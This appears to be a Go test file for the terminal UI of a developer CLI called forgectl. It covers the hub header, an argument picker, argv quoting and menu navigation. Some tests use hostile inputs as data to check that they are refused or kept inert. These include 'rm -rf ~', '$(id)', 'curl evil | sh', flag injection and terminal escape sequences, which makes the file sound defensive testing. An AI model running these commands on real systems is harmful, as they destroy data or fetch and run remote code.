package tui

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/cameronsjo/forgectl/internal/exec"
	"github.com/cameronsjo/forgectl/internal/termsafe/termsafetest"
	"github.com/cameronsjo/forgectl/internal/theme"
	"github.com/cameronsjo/forgectl/internal/tmux"
)

// --- header assembly (forgectl#730 item 1) ---

func TestHubHeaderLine_AllFields(t *testing.T) {
	h := HubHeader{
		Project: "cadence-ecosystem", Branch: "main",
		HasTmux: true, TmuxSessions: 3,
		HasReviews: true, ReviewsRunning: 1, ReviewsQueued: 2,
		HasDoctor: true, DoctorResult: "ok", DoctorAge: 2 * time.Hour,
	}
	want := "cadence-ecosystem @ main · 3 tmux · 1 review running, 2 queued · doctor ok (2h)"
	if got := h.Line(); got != want {
		t.Errorf("Line() = %q, want %q", got, want)
	}
}

func TestHubHeaderLine_OmitsUnavailableFields(t *testing.T) {
	for _, tc := range []struct {
		name string
		h    HubHeader
		want string
	}{
		{"nothing", HubHeader{}, ""},
		{"project without branch", HubHeader{Project: "forge"}, "forge"},
		{"branch without project", HubHeader{Branch: "main", HasTmux: true}, "0 tmux"},
		{"tmux unavailable keeps its count out", HubHeader{Project: "p", TmuxSessions: 4}, "p"},
		{"reviews unavailable", HubHeader{HasTmux: true, TmuxSessions: 1, ReviewsRunning: 3}, "1 tmux"},
		{"reviews zero", HubHeader{HasReviews: true}, ""},
		{"queued only", HubHeader{HasReviews: true, ReviewsQueued: 2}, "2 reviews queued"},
		{"running only", HubHeader{HasReviews: true, ReviewsRunning: 2}, "2 reviews running"},
		{"negative count dropped", HubHeader{HasTmux: true, TmuxSessions: -1, HasReviews: true, ReviewsRunning: -1}, ""},
		{"doctor without a result", HubHeader{HasDoctor: true, DoctorAge: time.Hour}, ""},
		{"doctor unavailable", HubHeader{DoctorResult: "ok"}, ""},
		{"doctor with a backwards clock", HubHeader{HasDoctor: true, DoctorResult: "warn", DoctorAge: -time.Minute}, "doctor warn"},
		{"doctor minutes", HubHeader{HasDoctor: true, DoctorResult: "ok", DoctorAge: 5 * time.Minute}, "doctor ok (5m)"},
		{"doctor days", HubHeader{HasDoctor: true, DoctorResult: "fail", DoctorAge: 72 * time.Hour}, "doctor fail (3d)"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := tc.h.Line(); got != tc.want {
				t.Errorf("Line() = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestHubHeaderLine_TerminalSafeAndCapped pins that a branch name — chosen by
// whoever pushed it — reaches the header inert and bounded.
func TestHubHeaderLine_TerminalSafeAndCapped(t *testing.T) {
	h := HubHeader{
		Project:      termsafetest.Hostile("proj"),
		Branch:       "feat/\x1b]0;pwned\x07\u202e" + strings.Repeat("x", 200),
		HasDoctor:    true,
		DoctorResult: termsafetest.Hostile("ok"),
	}
	line := h.Line()
	termsafetest.AssertInert(t, "hub header", line)
	for _, field := range strings.Split(line, " · ") {
		for _, part := range strings.Split(field, " @ ") {
			if n := len([]rune(strings.TrimPrefix(part, "doctor "))); n > hubHeaderValueMax+1 {
				t.Errorf("header value %q is %d runes, over the %d cap", part, n, hubHeaderValueMax)
			}
		}
	}
	if !strings.Contains(line, "…") {
		t.Errorf("an over-long branch was not visibly cut: %q", line)
	}
}

// --- inline argument picker (forgectl#730 item 4) ---

func TestPickerSpec(t *testing.T) {
	for _, tc := range []struct {
		use         string
		placeholder string
		optional    bool
		ok          bool
	}{
		{"pr <ref>", "<ref>", false, true},
		{"clone [query | url | owner/repo]", "[query | url | owner/repo]", true, true},
		{"worktree <query | url | owner/repo> [branch]", "<query | url | owner/repo>", false, true},
		{"last <repo>", "<repo>", false, true},
		{"list [dir|file ...]", "", false, false},
		{"launch [harness args…]", "", false, false},
		{"resume [filter]", "[filter]", true, true},
		{"rename <old> <new>", "", false, false},
		{"exec <kubectl exec args...>", "", false, false},
		{"inspect <kind>/<name> [kubectl flags...]", "", false, false},
		{"review [--kind issue|pr] [--repo <owner/name>]", "", false, false},
		{"__sops-edit FILE", "", false, false},
		{"doctor", "", false, false},
		{"broken <ref", "", false, false},
		{"broken ref>", "", false, false},
	} {
		placeholder, optional, ok := pickerSpec(tc.use)
		if placeholder != tc.placeholder || optional != tc.optional || ok != tc.ok {
			t.Errorf("pickerSpec(%q) = (%q, %v, %v), want (%q, %v, %v)", tc.use, placeholder, optional, ok, tc.placeholder, tc.optional, tc.ok)
		}
	}
}

// TestPickerArgv_HostileFreeText pins the argv boundary: whatever is typed
// becomes exactly one element, untouched — shell syntax stays inert text —
// and the values that would change what runs are refused.
func TestPickerArgv_HostileFreeText(t *testing.T) {
	prefix := []string{"pr"}
	for _, arg := range []string{
		"owner/repo#12",
		"; rm -rf ~",
		"$(id)",
		"`id`",
		"a b  c",
		"it's",
		"x && curl evil | sh",
		"https://github.com/o/r/pull/1?x=$(id)",
		strings.Repeat("é", pickerArgMaxRunes),
		// A combining mark outside Variation_Selector is text, not an
		// invisible rune (#948): decomposed accents still pass.
		"cafe\u0301",
	} {
		argv, err := PickerArgv(prefix, arg, false)
		if err != nil {
			t.Errorf("PickerArgv(%q) refused: %v", arg, err)
			continue
		}
		if len(argv) != 2 || argv[0] != "pr" || argv[1] != arg {
			t.Errorf("PickerArgv(%q) = %q, want [pr %q] as two elements", arg, argv, arg)
		}
	}
	for _, arg := range []string{
		"",
		"   ",
		"-x",
		"--agent=/tmp/evil",
		"--",
		"a\nb",
		"a\x1b[2Jb",
		"\u202eevil",
		"a\x00b",
		// Invisible format characters (#916): each makes the argument differ
		// from the ref it reads as.
		"o/r\u200b#1",
		"\ufeffo/r#1",
		"o/r#1\u2060",
		"o/r\u00ad#1",
		"o/r#1\U000E0041\U000E007F",
		"o/r\u2028#1",
		// Default-ignorable runes outside Cf, and the braille blank (#948):
		// Go counts each as graphic, so the renderers show them as is.
		"o/r\ufe0f#1",
		"o/r#1\U000E0100",
		"o/r\u034f#1",
		"\u3164",
		"o/r#1\uffa0",
		"\u115f\u1160",
		"\u2800",
		"o/r\u2800#1",
		"\xff\xfe",
		strings.Repeat("a", pickerArgMaxRunes+1),
	} {
		if argv, err := PickerArgv(prefix, arg, false); err == nil {
			t.Errorf("PickerArgv(%q) = %q, want a refusal", arg, argv)
		}
	}
}

func TestPickerArgv_OptionalAndPrefixIsolation(t *testing.T) {
	prefix := []string{"projects", "clone"}
	argv, err := PickerArgv(prefix, "", true)
	if err != nil || strings.Join(argv, " ") != "projects clone" {
		t.Errorf("empty optional = (%q, %v), want [projects clone]", argv, err)
	}
	if _, err := PickerArgv(prefix, "", false); err == nil {
		t.Error("empty required argument was accepted")
	}
	argv, _ = PickerArgv(prefix, "forge", true)
	argv[0] = "mutated"
	if prefix[0] != "projects" {
		t.Error("PickerArgv's result aliases the caller's prefix")
	}
}

func TestDisplayArgv(t *testing.T) {
	for _, tc := range []struct {
		argv []string
		want string
	}{
		{[]string{"pr", "owner/repo#12"}, "pr owner/repo#12"},
		{[]string{"pr", "https://github.com/o/r/pull/1"}, "pr https://github.com/o/r/pull/1"},
		{[]string{"projects", "clone", "a b"}, "projects clone 'a b'"},
		{[]string{"x", "it's"}, `x 'it'\''s'`},
		{[]string{"x", "$(id)"}, "x '$(id)'"},
		{[]string{"x", "#comment"}, "x '#comment'"},
		{[]string{"x", ""}, "x ''"},
		{[]string{"x", "=ls"}, "x '=ls'"},
		{[]string{"x", "a\x1b[2Jb"}, `x "a\x1b[2Jb"`},
	} {
		if got := DisplayArgv(tc.argv); got != tc.want {
			t.Errorf("DisplayArgv(%q) = %q, want %q", tc.argv, got, tc.want)
		}
	}
	termsafetest.AssertInert(t, "DisplayArgv", DisplayArgv([]string{"x", termsafetest.Hostile("y")}))
}

// pickerHubModel is a hub whose pr row needs its <ref> and whose projects
// clone leaf has a local candidate source.
func pickerHubModel(sources map[string]ArgSource) model {
	hub := []HubEntry{
		{Name: "pr", Short: "review a PR", Core: true, Use: "pr <ref>", Leaves: []HubLeaf{
			{Name: "pr", Short: "review a PR", Use: "pr <ref>", NeedsArgs: true, Self: true},
			{Name: "list", Short: "list sessions", Use: "list"},
		}},
		{Name: "projects", Short: "projects", Core: true, Use: "projects", Leaves: []HubLeaf{
			{Name: "clone", Short: "clone one", Use: "clone [query | url | owner/repo]", NeedsArgs: true},
			{Name: "rename", Short: "two args", Use: "rename <old> <new>", NeedsArgs: true},
		}},
		{Name: "recent", Heading: true},
		{Name: "sessions last", Short: "last session", Use: "last <repo>", Argv: []string{"sessions", "last"}, NeedsArgs: true},
		{Name: "pr prs", Short: "open PRs", Use: "prs", Argv: []string{"pr", "prs"}},
	}
	return sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{Hub: hub, ArgSources: sources, NoIcons: true, Theme: theme.Default()}), 80, 30)
}

func typeInto(m model, s string) model {
	for _, r := range s {
		out, _ := m.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
		m = out.(model)
	}
	return m
}

func press(m model, code rune) (model, tea.Cmd) {
	out, cmd := m.Update(tea.KeyPressMsg{Code: code})
	return out.(model), cmd
}

func TestPicker_PrRowTakesFreeTextAsOneArgvElement(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter) // pr row
	if m.picker == nil {
		t.Fatal("enter on the pr row did not open the picker")
	}
	// With nothing typed the only row is "browse pr subcommands…", and the
	// bottom line says so rather than claiming a command.
	if !strings.Contains(m.View().Content, "$ forgectl pr <subcommand>") {
		t.Errorf("the empty picker's bottom line does not show the browse form:\n%s", m.View().Content)
	}
	m = typeInto(m, "o/r#1; rm -rf ~")
	if !strings.Contains(m.View().Content, "$ forgectl pr 'o/r#1; rm -rf ~'") {
		t.Errorf("bottom line does not show the exact command:\n%s", m.View().Content)
	}
	m, cmd := press(m, tea.KeyEnter)
	if m.action.Kind != ActionRunVerb || len(m.action.Argv) != 2 || m.action.Argv[1] != "o/r#1; rm -rf ~" {
		t.Fatalf("action = %+v, want RunVerb [pr \"o/r#1; rm -rf ~\"]", m.action)
	}
	if cmd == nil {
		t.Error("a valid choice should quit to run it")
	}
}

func TestPicker_RefusesFlagShapedInputInPlace(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter)
	m = typeInto(m, "--agent=/tmp/evil")
	m, cmd := press(m, tea.KeyEnter)
	if m.action.Kind != ActionNone || cmd != nil {
		t.Fatalf("flag-shaped input ran: %+v", m.action)
	}
	if m.picker == nil || !strings.Contains(m.View().Content, "can't start with -") {
		t.Errorf("the refusal is not shown in the picker:\n%s", m.View().Content)
	}
}

func TestPicker_PasteIsOneValueAndControlsAreRefused(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter)
	out, _ := m.Update(tea.PasteMsg{Content: "o/r#1\n" + termsafetest.Hostile("x")})
	m = out.(model)
	termsafetest.AssertInert(t, "picker with a hostile paste", m.View().Content)
	m, cmd := press(m, tea.KeyEnter)
	if m.action.Kind != ActionNone || cmd != nil {
		t.Fatalf("a pasted value with controls ran: %+v", m.action)
	}
}

func TestPicker_BrowseRowDrillsIntoSubcommands(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter)
	m, _ = press(m, tea.KeyDown) // empty input: the browse row is the only row
	m, _ = press(m, tea.KeyEnter)
	if m.picker != nil || m.mode != leavesMode || strings.Join(m.leavesPath, " ") != "pr" {
		t.Fatalf("browse row did not open pr's leaves: mode=%v path=%q picker=%v", m.mode, m.leavesPath, m.picker != nil)
	}
}

func TestPicker_EscClosesWithoutRunning(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter)
	m, cmd := press(m, tea.KeyEscape)
	if m.picker != nil || m.mode != hubMode || cmd != nil || m.action.Kind != ActionNone {
		t.Errorf("esc: picker=%v mode=%v action=%+v cmd=%v", m.picker != nil, m.mode, m.action, cmd != nil)
	}
}

func TestPicker_CandidatesFromSourceFilterAndTabEdits(t *testing.T) {
	sources := map[string]ArgSource{
		"projects clone": func(context.Context) []string {
			return []string{"forgectl", "cadence", "-rf", termsafetest.Hostile("evil"), "forge\u200bctl", "forge-docs"}
		},
	}
	m := pickerHubModel(sources)
	m, _ = press(m, tea.KeyDown) // projects row
	m, _ = press(m, tea.KeyEnter)
	if m.mode != leavesMode {
		t.Fatalf("projects row did not drill in: %v", m.mode)
	}
	m, _ = press(m, tea.KeyEnter) // clone leaf
	if m.picker == nil {
		t.Fatal("clone leaf did not open the picker")
	}
	if got := m.picker.candidates; strings.Join(got, ",") != "forgectl,cadence,forge-docs" {
		t.Errorf("candidates = %q, want the source's valid names only", got)
	}
	termsafetest.AssertInert(t, "picker with a hostile source", m.View().Content)

	m = typeInto(m, "forge")
	m, _ = press(m, tea.KeyDown) // past the literal row to the first match
	m, _ = press(m, tea.KeyTab)  // copy it into the input
	if string(m.picker.input) != "forgectl" {
		t.Fatalf("tab did not copy the candidate into the input: %q", string(m.picker.input))
	}
	m, _ = press(m, tea.KeyEnter)
	if strings.Join(m.action.Argv, "|") != "projects|clone|forgectl" {
		t.Errorf("argv = %q, want [projects clone forgectl]", m.action.Argv)
	}
}

func TestPicker_OptionalArgumentRunsBareOnEmptyInput(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter) // projects -> leaves
	m, _ = press(m, tea.KeyEnter) // clone [query]
	m, _ = press(m, tea.KeyEnter)
	if m.action.Kind != ActionRunVerb || strings.Join(m.action.Argv, " ") != "projects clone" {
		t.Errorf("action = %+v, want RunVerb [projects clone]", m.action)
	}
}

func TestPicker_MultiArgLeafStillShowsInvocation(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter) // projects -> leaves
	m, _ = press(m, tea.KeyDown)  // rename <old> <new>
	m, _ = press(m, tea.KeyEnter)
	if m.picker != nil || m.action.Kind != ActionShowInvocation {
		t.Errorf("a two-argument leaf should print its invocation, got picker=%v action=%+v", m.picker != nil, m.action)
	}
}

func TestHub_RecentRowsRunOrPick(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyDown) // projects
	m, _ = press(m, tea.KeyDown) // heading is skipped
	if it, ok := m.l.SelectedItem().(hubItem); !ok || it.entry.Name != "sessions last" {
		t.Fatalf("cursor after the divider = %+v, want the first recent row", m.l.SelectedItem())
	}
	m, _ = press(m, tea.KeyUp)
	if it, ok := m.l.SelectedItem().(hubItem); !ok || it.entry.Name != "projects" {
		t.Fatalf("cursor moving up over the divider = %+v, want projects", m.l.SelectedItem())
	}
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter)
	if m.picker == nil || strings.Join(m.picker.prefix, " ") != "sessions last" {
		t.Fatalf("recent row needing <repo> did not open the picker")
	}
	m, _ = press(m, tea.KeyEscape)
	m, _ = press(m, tea.KeyDown)
	if !strings.Contains(m.View().Content, "$ forgectl pr prs") {
		t.Errorf("selected row's exact command is not shown:\n%s", m.View().Content)
	}
	m, _ = press(m, tea.KeyEnter)
	if m.action.Kind != ActionRunVerb || strings.Join(m.action.Argv, " ") != "pr prs" {
		t.Errorf("action = %+v, want RunVerb [pr prs]", m.action)
	}
}

func TestHub_HeadingIsInert(t *testing.T) {
	m := pickerHubModel(nil)
	m.l.Select(2) // the divider, reached directly
	out, cmd := m.activate()
	m = out.(model)
	if cmd != nil || m.action.Kind != ActionNone || m.picker != nil || m.mode != hubMode {
		t.Errorf("activating a divider did something: action=%+v mode=%v", m.action, m.mode)
	}
	if (hubItem{entry: HubEntry{Name: "recent", Heading: true}}).FilterValue() != "" {
		t.Error("a divider can be matched by a filter")
	}
}

func TestHub_HeaderLineReplacesTitle(t *testing.T) {
	m := sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{
		Hub:    []HubEntry{{Name: "doctor", Use: "doctor"}},
		Header: HubHeader{Project: "forge", Branch: "main", HasTmux: true, TmuxSessions: 2},
		Theme:  theme.Default(),
	}), 100, 20)
	first := strings.SplitN(m.View().Content, "\n", 2)[0]
	if !strings.Contains(first, "forge @ main · 2 tmux") {
		t.Errorf("hub header line = %q, want the status fields", first)
	}
}

// TestPicker_LongInputKeepsTheBoxHeight pins the edit line's cap: a value
// past the display width shows its tail on one line, so the box never grows
// past the lines applySize reserved.
func TestPicker_LongInputKeepsTheBoxHeight(t *testing.T) {
	m := pickerHubModel(nil)
	m, _ = press(m, tea.KeyEnter)
	before := strings.Count(m.View().Content, "\n")
	m = typeInto(m, strings.Repeat("a", 150)+"END")
	view := m.View().Content
	if got := strings.Count(view, "\n"); got != before {
		t.Errorf("a long value changed the screen from %d to %d lines", before, got)
	}
	if !strings.Contains(view, "…"+strings.Repeat("a", 30)) || !strings.Contains(view, "END") {
		t.Errorf("the edit line does not show the value's tail:\n%s", view)
	}
}

// TestPicker_UsesTheSuppliedBuilder pins that the picker runs every choice —
// typed values and candidates alike — through RunOptions.BuildArgv, so the
// caller's tree-aware refusal holds on both paths.
func TestPicker_UsesTheSuppliedBuilder(t *testing.T) {
	refuseDrain := func(prefix []string, arg string, optional bool) ([]string, error) {
		if arg == "drain" {
			return nil, errors.New("that value names a subcommand")
		}
		return PickerArgv(prefix, arg, optional)
	}
	hub := []HubEntry{{Name: "pr", Use: "pr <ref>"}}
	sources := map[string]ArgSource{"pr": func(context.Context) []string { return []string{"drain", "o/r#1"} }}
	m := sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{
		Hub: hub, ArgSources: sources, BuildArgv: refuseDrain, NoIcons: true, Theme: theme.Default(),
	}), 80, 30)
	m, _ = press(m, tea.KeyEnter)
	if got := strings.Join(m.picker.candidates, ","); got != "o/r#1" {
		t.Errorf("candidates = %q, want the refused one dropped", got)
	}
	m = typeInto(m, "drain")
	m, cmd := press(m, tea.KeyEnter)
	if m.action.Kind != ActionNone || cmd != nil {
		t.Fatalf("a refused value ran: %+v", m.action)
	}
	if !strings.Contains(m.View().Content, "names a subcommand") {
		t.Errorf("the refusal is not shown:\n%s", m.View().Content)
	}
}

// TestPicker_SlowSourceOpensWithoutCandidates pins pickerSourceBudget.
func TestPicker_SlowSourceOpensWithoutCandidates(t *testing.T) {
	release := make(chan struct{})
	defer close(release)
	slow := map[string]ArgSource{"pr": func(context.Context) []string { <-release; return []string{"late"} }}
	m := sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{
		Hub: []HubEntry{{Name: "pr", Use: "pr <ref>"}}, ArgSources: slow, NoIcons: true, Theme: theme.Default(),
	}), 80, 30)
	start := time.Now()
	m, _ = press(m, tea.KeyEnter)
	if time.Since(start) > 2*time.Second {
		t.Fatal("opening the picker waited on a stalled source")
	}
	if m.picker == nil || len(m.picker.candidates) != 0 {
		t.Errorf("picker = %+v, want it open with no candidates", m.picker)
	}
}

// TestHub_JumpKeysFollowTheRowNotThePosition pins forgectl#1074's stable
// keys: a digit runs the row that carries it, wherever recent rows have
// pushed that row, and a digit no row carries does nothing.
func TestHub_JumpKeysFollowTheRowNotThePosition(t *testing.T) {
	hub := []HubEntry{
		{Name: "doctor", Short: "health check", Key: 1},
		{Name: "recent", Heading: true},
		{Name: "pr prs", Short: "open PRs", Use: "prs", Argv: []string{"pr", "prs"}},
		{Name: "all commands (2)", Heading: true},
		{Name: "repos", Short: "branch · clean", Key: 2, Members: []HubEntry{
			{Name: "branch", Short: "prune branches"},
			{Name: "clean", Short: "reclaim space"},
		}},
	}
	m := sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{Hub: hub, NoIcons: true, Theme: theme.Default()}), 80, 24)

	out, cmd := m.Update(key("3"))
	got := out.(model)
	if cmd != nil || got.action.Kind != ActionNone || got.mode != hubMode {
		t.Fatalf("a key no row carries did something: mode=%v action=%+v", got.mode, got.action)
	}

	out, _ = m.Update(key("2"))
	got = out.(model)
	if got.mode != areaMode || got.title != "repos" {
		t.Fatalf("key 2 = mode %v title %q, want the repos area (the third row's position is the recent row)", got.mode, got.title)
	}
	// Inside the area, members are keyed by position, and esc goes back to
	// the hub with the area row selected.
	out, cmd = got.Update(key("2"))
	if a := out.(model).action; cmd == nil || a.Kind != ActionRunVerb || strings.Join(a.Argv, " ") != "clean" {
		t.Errorf("key 2 in the area = %+v, want RunVerb [clean]", a)
	}
	out, _ = got.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	back := out.(model)
	if it, ok := back.l.SelectedItem().(hubItem); back.mode != hubMode || !ok || it.entry.Name != "repos" {
		t.Errorf("esc from the area: mode=%v cursor=%+v, want hubMode on repos", back.mode, back.l.SelectedItem())
	}
}

// TestHub_SearchCoversEveryCommand pins that "/" on the top screen searches
// every command, including those inside areas, and that clearing the filter
// brings the top screen back.
func TestHub_SearchCoversEveryCommand(t *testing.T) {
	hub := []HubEntry{
		{Name: "doctor", Short: "health check", Key: 1},
		{Name: "recent", Heading: true},
		{Name: "pr prs", Short: "open PRs", Use: "prs", Argv: []string{"pr", "prs"}},
		{Name: "repos", Short: "branch · clean", Key: 2, Members: []HubEntry{
			{Name: "branch", Short: "prune branches"},
			{Name: "clean", Short: "reclaim space", Leaves: []HubLeaf{{Name: "now", Short: "clean now", Use: "now"}}},
		}},
	}
	m := sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{Hub: hub, NoIcons: true, Theme: theme.Default()}), 80, 24)
	// search applies the filter text directly: bubbles filters through a
	// returned command, which these tests do not run.
	search := func(m model, text string) model {
		m = typeInto(m, "/")
		m.l.SetFilterText(text)
		return m
	}
	m = search(m, "clean")
	if len(m.l.VisibleItems()) != 1 {
		t.Fatalf("filter clean shows %d rows, want only clean", len(m.l.VisibleItems()))
	}
	if it, ok := m.l.SelectedItem().(hubItem); !ok || it.entry.Name != "clean" {
		t.Fatalf("filtered cursor = %+v, want clean", m.l.SelectedItem())
	}
	m, _ = press(m, tea.KeyEnter) // open clean's subcommands
	if m.mode != leavesMode {
		t.Fatalf("enter on a searched module: mode=%v, want leavesMode", m.mode)
	}
	// esc goes back to the area the command lives in, then to the top
	// screen with that area selected.
	m, _ = press(m, tea.KeyEscape)
	if m.mode != areaMode || m.title != "repos" {
		t.Fatalf("esc from a searched module: mode=%v title=%q, want the repos area", m.mode, m.title)
	}
	m, _ = press(m, tea.KeyEscape)
	if m.mode != hubMode || len(m.l.Items()) != len(hub) {
		t.Fatalf("esc from the area: mode=%v rows=%d, want the %d-row top screen", m.mode, len(m.l.Items()), len(hub))
	}

	// Clearing a filter on the top screen restores it and does not quit.
	m = search(m, "clean")
	m, cmd := press(m, tea.KeyEscape)
	if cmd != nil || m.mode != hubMode || m.hubFlat || len(m.l.Items()) != len(hub) {
		t.Errorf("esc on an applied filter: quit=%v flat=%v rows=%d, want the top screen back", cmd != nil, m.hubFlat, len(m.l.Items()))
	}
}

// optOutHubModel is a hub whose every argument-taking row carries NoPicker
// (the forgectl:hub-no-picker annotation): a module row, its leaves, and a
// recent row. Beside each sits an otherwise identical row without it.
func optOutHubModel() model {
	hub := []HubEntry{
		{Name: "wrap", Short: "wraps a CLI", Core: true, Use: "wrap <sub>", NoPicker: true, Leaves: []HubLeaf{
			{Name: "wrap", Short: "wraps a CLI", Use: "wrap <sub>", NeedsArgs: true, Self: true, NoPicker: true},
			{Name: "pass", Short: "passes one through", Use: "pass <sub>", NeedsArgs: true, NoPicker: true},
			{Name: "plain", Short: "takes a plain value", Use: "plain <name>", NeedsArgs: true},
		}},
		{Name: "recent", Heading: true},
		{Name: "wrap pass", Short: "passes one through", Use: "pass <sub>", Argv: []string{"wrap", "pass"}, NeedsArgs: true, NoPicker: true},
		{Name: "wrap plain", Short: "takes a plain value", Use: "plain <name>", Argv: []string{"wrap", "plain"}, NeedsArgs: true},
	}
	return sized(newModel(context.Background(), tmux.New(&exec.FakeRunner{}), RunOptions{Hub: hub, NoIcons: true, Theme: theme.Default()}), 80, 30)
}

// TestPicker_NoPickerRowsShowTheInvocation pins the opt-out: a row, leaf or
// recent row marked NoPicker never opens the picker, even though its Use names
// one positional the picker could otherwise supply; it prints the invocation
// to finish by hand. The unmarked twin of each still opens the picker.
//
// Mutations that turn it red: drop the noPicker check from openPicker (the
// leaf and recent rows open it); drop the NoPicker check from moduleNeedsArg
// (the module row opens it).
func TestPicker_NoPickerRowsShowTheInvocation(t *testing.T) {
	// Module row: drills into its leaves instead of opening the picker.
	m := optOutHubModel()
	m, _ = press(m, tea.KeyEnter)
	if m.picker != nil {
		t.Fatal("enter on an opted-out module row opened the picker")
	}
	if m.mode != leavesMode {
		t.Fatalf("an opted-out module row should drill into its leaves, mode = %v", m.mode)
	}
	// Its synthetic self leaf and an opted-out leaf print the invocation.
	for _, down := range []int{0, 1} {
		m := optOutHubModel()
		m, _ = press(m, tea.KeyEnter)
		for range down {
			m, _ = press(m, tea.KeyDown)
		}
		m, _ = press(m, tea.KeyEnter)
		if m.picker != nil || m.action.Kind != ActionShowInvocation {
			t.Errorf("opted-out leaf %d: picker=%v action=%+v, want the invocation", down, m.picker != nil, m.action)
		}
	}
	// Control: the unmarked leaf beside them opens the picker.
	m = optOutHubModel()
	m, _ = press(m, tea.KeyEnter)
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter)
	if m.picker == nil {
		t.Error("an unmarked leaf no longer opens the picker")
	}

	// Recent rows: the opted-out one prints its invocation, its twin picks.
	m = optOutHubModel()
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter)
	if m.picker != nil || m.action.Kind != ActionShowInvocation {
		t.Errorf("opted-out recent row: picker=%v action=%+v, want the invocation", m.picker != nil, m.action)
	}
	m = optOutHubModel()
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyDown)
	m, _ = press(m, tea.KeyEnter)
	if m.picker == nil {
		t.Error("an unmarked recent row no longer opens the picker")
	}
}
